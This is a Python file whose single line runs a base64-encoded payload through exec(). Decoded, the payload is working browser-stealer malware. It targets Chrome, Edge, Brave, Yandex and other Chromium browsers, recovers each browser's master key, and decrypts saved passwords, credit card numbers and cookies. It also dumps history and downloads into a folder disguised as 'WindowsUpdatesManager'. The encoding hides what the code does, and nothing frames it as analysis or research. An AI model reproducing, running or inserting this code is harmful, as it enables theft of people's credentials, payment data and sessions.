import base64

exec(base64.b64decode('aW1wb3J0IGJhc2U2NA0KaW1wb3J0IGpzb24NCmltcG9ydCBvcw0KaW1wb3J0IHNodXRpbA0KaW1wb3J0IHNxbGl0ZTMNCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lLCB0aW1lZGVsdGENCg0KZnJvbSBDcnlwdG9kb21lLkNpcGhlciBpbXBvcnQgQUVTDQpmcm9tIHdpbjMyY3J5cHQgaW1wb3J0IENyeXB0VW5wcm90ZWN0RGF0YQ0KDQphcHBkYXRhID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQ0KDQpicm93c2VycyA9IHsNCiAgICAnYXZhc3QnOiBhcHBkYXRhICsgJ1xcQVZBU1QgU29mdHdhcmVcXEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ2FtaWdvJzogYXBwZGF0YSArICdcXEFtaWdvXFxVc2VyIERhdGEnLA0KICAgICd0b3JjaCc6IGFwcGRhdGEgKyAnXFxUb3JjaFxcVXNlciBEYXRhJywNCiAgICAna29tZXRhJzogYXBwZGF0YSArICdcXEtvbWV0YVxcVXNlciBEYXRhJywNCiAgICAnb3JiaXR1bSc6IGFwcGRhdGEgKyAnXFxPcmJpdHVtXFxVc2VyIERhdGEnLA0KICAgICdjZW50LWJyb3dzZXInOiBhcHBkYXRhICsgJ1xcQ2VudEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJzdzdGFyJzogYXBwZGF0YSArICdcXDdTdGFyXFw3U3RhclxcVXNlciBEYXRhJywNCiAgICAnc3B1dG5payc6IGFwcGRhdGEgKyAnXFxTcHV0bmlrXFxTcHV0bmlrXFxVc2VyIERhdGEnLA0KICAgICd2aXZhbGRpJzogYXBwZGF0YSArICdcXFZpdmFsZGlcXFVzZXIgRGF0YScsDQogICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogYXBwZGF0YSArICdcXEdvb2dsZVxcQ2hyb21lIFN4U1xcVXNlciBEYXRhJywNCiAgICAnZ29vZ2xlLWNocm9tZSc6IGFwcGRhdGEgKyAnXFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhJywNCiAgICAnZXBpYy1wcml2YWN5LWJyb3dzZXInOiBhcHBkYXRhICsgJ1xcRXBpYyBQcml2YWN5IEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ21pY3Jvc29mdC1lZGdlJzogYXBwZGF0YSArICdcXE1pY3Jvc29mdFxcRWRnZVxcVXNlciBEYXRhJywNCiAgICAndXJhbic6IGFwcGRhdGEgKyAnXFx1Q296TWVkaWFcXFVyYW5cXFVzZXIgRGF0YScsDQogICAgJ3lhbmRleCc6IGFwcGRhdGEgKyAnXFxZYW5kZXhcXFlhbmRleEJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ2JyYXZlJzogYXBwZGF0YSArICdcXEJyYXZlU29mdHdhcmVcXEJyYXZlLUJyb3dzZXJcXFVzZXIgRGF0YScsDQogICAgJ2lyaWRpdW0nOiBhcHBkYXRhICsgJ1xcSXJpZGl1bVxcVXNlciBEYXRhJywNCn0NCg0KZGF0YV9xdWVyaWVzID0gew0KICAgICdsb2dpbl9kYXRhJzogew0KICAgICAgICAncXVlcnknOiAnU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2lucycsDQogICAgICAgICdmaWxlJzogJ1xcTG9naW4gRGF0YScsDQogICAgICAgICdjb2x1bW5zJzogWydVUkwnLCAnRW1haWwnLCAnUGFzc3dvcmQnXSwNCiAgICAgICAgJ2RlY3J5cHQnOiBUcnVlDQogICAgfSwNCiAgICAnY3JlZGl0X2NhcmRzJzogew0KICAgICAgICAncXVlcnknOiAnU0VMRUNUIG5hbWVfb25fY2FyZCwgZXhwaXJhdGlvbl9tb250aCwgZXhwaXJhdGlvbl95ZWFyLCBjYXJkX251bWJlcl9lbmNyeXB0ZWQsIGRhdGVfbW9kaWZpZWQgRlJPTSBjcmVkaXRfY2FyZHMnLA0KICAgICAgICAnZmlsZSc6ICdcXFdlYiBEYXRhJywNCiAgICAgICAgJ2NvbHVtbnMnOiBbJ05hbWUgT24gQ2FyZCcsICdDYXJkIE51bWJlcicsICdFeHBpcmVzIE9uJywgJ0FkZGVkIE9uJ10sDQogICAgICAgICdkZWNyeXB0JzogVHJ1ZQ0KICAgIH0sDQogICAgJ2Nvb2tpZXMnOiB7DQogICAgICAgICdxdWVyeSc6ICdTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIHBhdGgsIGVuY3J5cHRlZF92YWx1ZSwgZXhwaXJlc191dGMgRlJPTSBjb29raWVzJywNCiAgICAgICAgJ2ZpbGUnOiAnXFxOZXR3b3JrXFxDb29raWVzJywNCiAgICAgICAgJ2NvbHVtbnMnOiBbJ0hvc3QgS2V5JywgJ0Nvb2tpZSBOYW1lJywgJ1BhdGgnLCAnQ29va2llJywgJ0V4cGlyZXMgT24nXSwNCiAgICAgICAgJ2RlY3J5cHQnOiBUcnVlDQogICAgfSwNCiAgICAnaGlzdG9yeSc6IHsNCiAgICAgICAgJ3F1ZXJ5JzogJ1NFTEVDVCB1cmwsIHRpdGxlLCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzJywNCiAgICAgICAgJ2ZpbGUnOiAnXFxIaXN0b3J5JywNCiAgICAgICAgJ2NvbHVtbnMnOiBbJ1VSTCcsICdUaXRsZScsICdWaXNpdGVkIFRpbWUnXSwNCiAgICAgICAgJ2RlY3J5cHQnOiBGYWxzZQ0KICAgIH0sDQogICAgJ2Rvd25sb2Fkcyc6IHsNCiAgICAgICAgJ3F1ZXJ5JzogJ1NFTEVDVCB0YWJfdXJsLCB0YXJnZXRfcGF0aCBGUk9NIGRvd25sb2FkcycsDQogICAgICAgICdmaWxlJzogJ1xcSGlzdG9yeScsDQogICAgICAgICdjb2x1bW5zJzogWydEb3dubG9hZCBVUkwnLCAnTG9jYWwgUGF0aCddLA0KICAgICAgICAnZGVjcnlwdCc6IEZhbHNlDQogICAgfQ0KfQ0KDQoNCmRlZiBnZXRfbWFzdGVyX2tleShwYXRoOiBzdHIpOg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKToNCiAgICAgICAgcmV0dXJuDQoNCiAgICBpZiAnb3NfY3J5cHQnIG5vdCBpbiBvcGVuKHBhdGggKyAiXFxMb2NhbCBTdGF0ZSIsICdyJywgZW5jb2Rpbmc9J3V0Zi04JykucmVhZCgpOg0KICAgICAgICByZXR1cm4NCg0KICAgIHdpdGggb3BlbihwYXRoICsgIlxcTG9jYWwgU3RhdGUiLCAiciIsIGVuY29kaW5nPSJ1dGYtOCIpIGFzIGY6DQogICAgICAgIGMgPSBmLnJlYWQoKQ0KICAgIGxvY2FsX3N0YXRlID0ganNvbi5sb2FkcyhjKQ0KDQogICAga2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKQ0KICAgIGtleSA9IGtleVs1Ol0NCiAgICBrZXkgPSBDcnlwdFVucHJvdGVjdERhdGEoa2V5LCBOb25lLCBOb25lLCBOb25lLCAwKVsxXQ0KICAgIHJldHVybiBrZXkNCg0KDQpkZWYgZGVjcnlwdF9wYXNzd29yZChidWZmOiBieXRlcywga2V5OiBieXRlcykgLT4gc3RyOg0KICAgIGl2ID0gYnVmZlszOjE1XQ0KICAgIHBheWxvYWQgPSBidWZmWzE1Ol0NCiAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBpdikNCiAgICBkZWNyeXB0ZWRfcGFzcyA9IGNpcGhlci5kZWNyeXB0KHBheWxvYWQpDQogICAgZGVjcnlwdGVkX3Bhc3MgPSBkZWNyeXB0ZWRfcGFzc1s6LTE2XS5kZWNvZGUoKQ0KDQogICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzDQoNCg0KZGVmIHNhdmVfcmVzdWx0cyhicm93c2VyX25hbWUsIHR5cGVfb2ZfZGF0YSwgY29udGVudCk6DQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGJyb3dzZXJfbmFtZSk6DQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpfS9XaW5kb3dzVXBkYXRlc01hbmFnZXIvU25reS1tYWluL2Jyb3dzZXJzIik6DQogICAgICAgICAgICBvcy5ta2RpcihmIntvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpfS9XaW5kb3dzVXBkYXRlc01hbmFnZXIvU25reS1tYWluL2Jyb3dzZXJzIikNCiAgICAgICAgDQogICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhmIntvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpfS9XaW5kb3dzVXBkYXRlc01hbmFnZXIvU25reS1tYWluL2Jyb3dzZXJzLyIgKyBicm93c2VyX25hbWUpOg0KICAgICAgICAgICAgb3MubWtkaXIoZiJ7b3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKX0vV2luZG93c1VwZGF0ZXNNYW5hZ2VyL1Nua3ktbWFpbi9icm93c2Vycy8iICsgYnJvd3Nlcl9uYW1lKQ0KICAgIGlmIGNvbnRlbnQgaXMgbm90IE5vbmU6DQogICAgICAgIG9wZW4oZid7b3MuZ2V0ZW52KCJMT0NBTEFQUERBVEEiKX0vV2luZG93c1VwZGF0ZXNNYW5hZ2VyL1Nua3ktbWFpbi9icm93c2Vycy97YnJvd3Nlcl9uYW1lfS97dHlwZV9vZl9kYXRhfS50eHQnLCAndycsIGVuY29kaW5nPSJ1dGYtOCIpLndyaXRlKGNvbnRlbnQpDQogICAgICAgIHByaW50KGYiXHQgWypdIFNhdmVkIGluIHticm93c2VyX25hbWV9L3t0eXBlX29mX2RhdGF9LnR4dCIpDQogICAgZWxzZToNCiAgICAgICAgcHJpbnQoZiJcdCBbLV0gTm8gRGF0YSBGb3VuZCEiKQ0KDQoNCmRlZiBnZXRfZGF0YShwYXRoOiBzdHIsIHByb2ZpbGU6IHN0ciwga2V5LCB0eXBlX29mX2RhdGEpOg0KICAgIGRiX2ZpbGUgPSBmJ3twYXRofVxce3Byb2ZpbGV9e3R5cGVfb2ZfZGF0YVsiZmlsZSJdfScNCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoZGJfZmlsZSk6DQogICAgICAgIHJldHVybg0KICAgIHJlc3VsdCA9ICIiDQogICAgc2h1dGlsLmNvcHkoZGJfZmlsZSwgJ3RlbXBfZGInKQ0KICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3QoJ3RlbXBfZGInKQ0KICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkNCiAgICBjdXJzb3IuZXhlY3V0ZSh0eXBlX29mX2RhdGFbJ3F1ZXJ5J10pDQogICAgZm9yIHJvdyBpbiBjdXJzb3IuZmV0Y2hhbGwoKToNCiAgICAgICAgcm93ID0gbGlzdChyb3cpDQogICAgICAgIGlmIHR5cGVfb2ZfZGF0YVsnZGVjcnlwdCddOg0KICAgICAgICAgICAgZm9yIGkgaW4gcmFuZ2UobGVuKHJvdykpOg0KICAgICAgICAgICAgICAgIGlmIGlzaW5zdGFuY2Uocm93W2ldLCBieXRlcyk6DQogICAgICAgICAgICAgICAgICAgIHJvd1tpXSA9IGRlY3J5cHRfcGFzc3dvcmQocm93W2ldLCBrZXkpDQogICAgICAgIGlmIGRhdGFfdHlwZV9uYW1lID09ICdoaXN0b3J5JzoNCiAgICAgICAgICAgIGlmIHJvd1syXSAhPSAwOg0KICAgICAgICAgICAgICAgIHJvd1syXSA9IGNvbnZlcnRfY2hyb21lX3RpbWUocm93WzJdKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICByb3dbMl0gPSAiMCINCiAgICAgICAgcmVzdWx0ICs9ICJcbiIuam9pbihbZiJ7Y29sfToge3ZhbH0iIGZvciBjb2wsIHZhbCBpbiB6aXAodHlwZV9vZl9kYXRhWydjb2x1bW5zJ10sIHJvdyldKSArICJcblxuIg0KICAgIGNvbm4uY2xvc2UoKQ0KICAgIG9zLnJlbW92ZSgndGVtcF9kYicpDQogICAgcmV0dXJuIHJlc3VsdA0KDQoNCmRlZiBjb252ZXJ0X2Nocm9tZV90aW1lKGNocm9tZV90aW1lKToNCiAgICByZXR1cm4gKGRhdGV0aW1lKDE2MDEsIDEsIDEpICsgdGltZWRlbHRhKG1pY3Jvc2Vjb25kcz1jaHJvbWVfdGltZSkpLnN0cmZ0aW1lKCclZC8lbS8lWSAlSDolTTolUycpDQoNCg0KZGVmIGluc3RhbGxlZF9icm93c2VycygpOg0KICAgIGF2YWlsYWJsZSA9IFtdDQogICAgZm9yIHggaW4gYnJvd3NlcnMua2V5cygpOg0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhicm93c2Vyc1t4XSk6DQogICAgICAgICAgICBhdmFpbGFibGUuYXBwZW5kKHgpDQogICAgcmV0dXJuIGF2YWlsYWJsZQ0KDQoNCg0KYXZhaWxhYmxlX2Jyb3dzZXJzID0gaW5zdGFsbGVkX2Jyb3dzZXJzKCkNCg0KZm9yIGJyb3dzZXIgaW4gYXZhaWxhYmxlX2Jyb3dzZXJzOg0KICAgIGJyb3dzZXJfcGF0aCA9IGJyb3dzZXJzW2Jyb3dzZXJdDQogICAgbWFzdGVyX2tleSA9IGdldF9tYXN0ZXJfa2V5KGJyb3dzZXJfcGF0aCkNCiAgICBwcmludChmIkdldHRpbmcgU3RvcmVkIERldGFpbHMgZnJvbSB7YnJvd3Nlcn0iKQ0KDQogICAgZm9yIGRhdGFfdHlwZV9uYW1lLCBkYXRhX3R5cGUgaW4gZGF0YV9xdWVyaWVzLml0ZW1zKCk6DQogICAgICAgIHByaW50KGYiXHQgWyFdIEdldHRpbmcge2RhdGFfdHlwZV9uYW1lLnJlcGxhY2UoJ18nLCAnICcpLmNhcGl0YWxpemUoKX0iKQ0KICAgICAgICBkYXRhID0gZ2V0X2RhdGEoYnJvd3Nlcl9wYXRoLCAiRGVmYXVsdCIsIG1hc3Rlcl9rZXksIGRhdGFfdHlwZSkNCiAgICAgICAgc2F2ZV9yZXN1bHRzKGJyb3dzZXIsIGRhdGFfdHlwZV9uYW1lLCBkYXRhKQ0KICAgICAgICBwcmludCgiXHQtLS0tLS1cbiIpDQoNCg=='))